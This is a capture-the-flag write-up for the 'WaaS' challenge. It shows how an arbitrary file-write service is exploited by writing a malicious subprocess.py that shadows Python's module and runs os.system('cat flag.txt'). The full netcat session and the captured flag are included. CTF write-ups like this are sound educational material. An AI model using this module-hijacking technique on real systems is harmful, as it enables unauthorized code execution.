# WaaS
Writing as a Service! Author: NoobMaster + NoobHacker

# Flag
```
n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_8ea61a9c227a}
```

# Solution
The service allows us to write into files in the filesystem (excluding `/bin`,`/proc` and `chall.py` itself).

As the script imports the `subprocess` module, we can trick the Python script into importing our own malicious script by writing into a file named `subprocess.py`. We can create our own `run()` function to execute commands when it is called in the script (see `subprocess.py`). 

```shell-session
jerald@DESKTOP-HGSM9AM:~/ctf/n00bz2024/misc/waas$ nc challs.n00bzunit3d.xyz 10433
[1] Write to a file
[2] Get the flag
[3] Exit
Choice: 1  
Enter file name: subprocess.py
Data: def run(args, capture_output): import os; os.system('cat flag.txt')
Data written sucessfully!
[1] Write to a file
[2] Get the flag
[3] Exit

<Exit the program and reconnect>

jerald@DESKTOP-HGSM9AM:~/ctf/n00bz2024/misc/waas$ nc challs.n00bzunit3d.xyz 10433
[1] Write to a file
[2] Get the flag
[3] Exit
Choice: 2
n00bz{0v3rwr1t1ng_py7h0n3_m0dul3s?!!!_8ea61a9c227a}
```